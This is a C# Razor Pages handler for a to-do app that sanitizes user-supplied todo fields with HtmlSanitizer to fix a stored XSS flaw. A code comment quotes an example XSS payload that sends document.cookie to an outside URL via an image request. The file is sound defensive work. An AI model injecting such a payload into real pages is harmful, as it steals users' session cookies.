using Ganss.Xss;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.RazorPages;
using ToDotNet.Models;

namespace ToDotNet.Pages.Todos
{
    public class CreateModel : PageModel
    {
        private readonly Data.ToDotNetContext _context;

        public CreateModel(Data.ToDotNetContext context)
        {
            _context = context;
        }

        public IActionResult OnGet(int? uid)
        {
            ViewData["UserId"] = uid;
            return Page();
        }

        [BindProperty]
        public Todo Todo { get; set; } = default!;
        
        public async Task<IActionResult> OnPostAsync()
        {
            // Fix persistent XSS vulnerability!!!
            // Example: <script>new Image().src="https://www.google.com.br/search?q="+document.cookie</script>

            var sanitizer = new HtmlSanitizer();
            Todo.Title = sanitizer.Sanitize(Todo.Title);
            Todo.Description = sanitizer.Sanitize(Todo.Description);
            Todo.Category = sanitizer.Sanitize(Todo.Category);

            _context.Todo.Add(Todo); await _context.SaveChangesAsync();

            return RedirectToPage("./Index", new { uid = Todo.UserId});
        }
    }
}